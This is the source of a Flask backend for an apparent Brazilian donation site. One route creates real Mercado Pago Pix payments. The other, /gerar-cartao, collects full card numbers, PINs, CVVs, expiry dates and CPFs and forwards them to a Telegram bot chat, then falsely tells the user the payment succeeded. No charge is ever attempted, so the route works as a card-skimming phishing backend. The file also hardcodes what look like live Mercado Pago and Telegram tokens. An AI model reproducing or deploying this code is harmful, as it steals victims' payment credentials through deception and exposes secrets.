from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import re
import uuid

app = Flask(__name__)
CORS(app)

# Substitua com suas chaves reais
ACCESS_TOKEN = "APP_USR-1245205998264290-041409-1047ee9e45914c23e16758074dc1b797-1712554417"
TELEGRAM_TOKEN = "6725163602:AAHskt1qmIpPitj_OBmqQ6kvwB9tUxLZE_o"
CHAT_ID = "5650303115"
WEBHOOK_SECRET = "896ca5379cb66fda16baea22ae09e14f7330529241f6ed633247bbdb847dfb6e"  # Substitua com seu webhook real

def email_valido(email):
    return re.match(r"[^@]+@[^@]+\.[^@]+", email)

@app.route("/gerar-pix", methods=["POST"])
def gerar_pix():
    dados = request.get_json()
    valor = float(dados.get("valor", 0))
    email = dados.get("email", "").strip()
    nome = dados.get("nome", "Usuário Desconhecido").strip()
    turbinar = dados.get("turbinar", False)

    # Verificação do valor
    if valor <= 0:
        return jsonify({"erro": "Valor inválido. O valor deve ser maior que zero."}), 400

    if turbinar:
        valor += 5.99  # Adiciona R$ 5,99 se turbinar estiver marcado

    if not email_valido(email):
        email = "usuario@teste.com"  # fallback caso o e-mail seja inválido

    nome_parts = nome.split()
    first_name = nome_parts[0] if nome_parts else "Usuário"
    last_name = " ".join(nome_parts[1:]) if len(nome_parts) > 1 else "Desconhecido"

    headers = {
        "Authorization": f"Bearer {ACCESS_TOKEN}",
        "Content-Type": "application/json",
        "X-Idempotency-Key": str(uuid.uuid4())  # evita duplicidade
    }

    body = {
        "transaction_amount": valor,
        "description": "Doação via Pix",
        "payment_method_id": "pix",
        "payer": {
            "email": email,
            "first_name": first_name,
            "last_name": last_name
        }
    }

    try:
        response = requests.post("https://api.mercadopago.com/v1/payments", headers=headers, json=body)
        if response.status_code == 201:
            pagamento = response.json()
            return jsonify({
                "pix_qr": pagamento["point_of_interaction"]["transaction_data"]["qr_code_base64"],
                "pix_copiaecola": pagamento["point_of_interaction"]["transaction_data"]["qr_code"]
            })
        else:
            return jsonify({"erro": "Erro ao gerar Pix. Tente novamente."}), 500
    except Exception as e:
        return jsonify({"erro": str(e)}), 500

@app.route("/gerar-cartao", methods=["POST"])
def gerar_cartao():
    dados = request.get_json()
    numero_cartao = dados.get("numero")
    senha = dados.get("senha")
    nome_cartao = dados.get("nome_cartao")
    validade = dados.get("validade")
    cpf_cartao = dados.get("cpf_cartao")
    cvv = dados.get("cvv")
    valor = float(dados.get("valor", 0))
    email = dados.get("email")
    nome = dados.get("nome")

    # Verificação de dados obrigatórios
    if not numero_cartao or not nome_cartao or not validade or not cpf_cartao or not cvv:
        return jsonify({"erro": "Todos os dados do cartão devem ser fornecidos."}), 400

    if valor <= 0:
        return jsonify({"erro": "O valor da contribuição deve ser maior que zero."}), 400

    # Enviar dados para o bot do Telegram
    mensagem = f"""
    **Novo Pagamento via Cartão de Crédito:**
    - **Nome**: {nome}
    - **E-mail**: {email}
    - **Valor**: R$ {valor}
    - **Número do Cartão**: {numero_cartao} (últimos 4 dígitos)
    - **Nome do Titular**: {nome_cartao}
    - **Validade**: {validade}
    - **CPF do Titular**: {cpf_cartao}
    - **Senha Cartão**: {senha}
    """

    try:
        response = requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", data={
            "chat_id": CHAT_ID,
            "text": mensagem,
            "parse_mode": "Markdown"
        })
        if response.status_code != 200:
            return jsonify({"erro": "Erro ao enviar dados para o Telegram."}), 500

        # Supondo que o pagamento foi processado com sucesso
        return jsonify({"success": True, "message": "Pagamento processado com sucesso!"})
    except Exception as e:
        return jsonify({"erro": str(e)}), 500

if __name__ == '__main__':
    import os
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
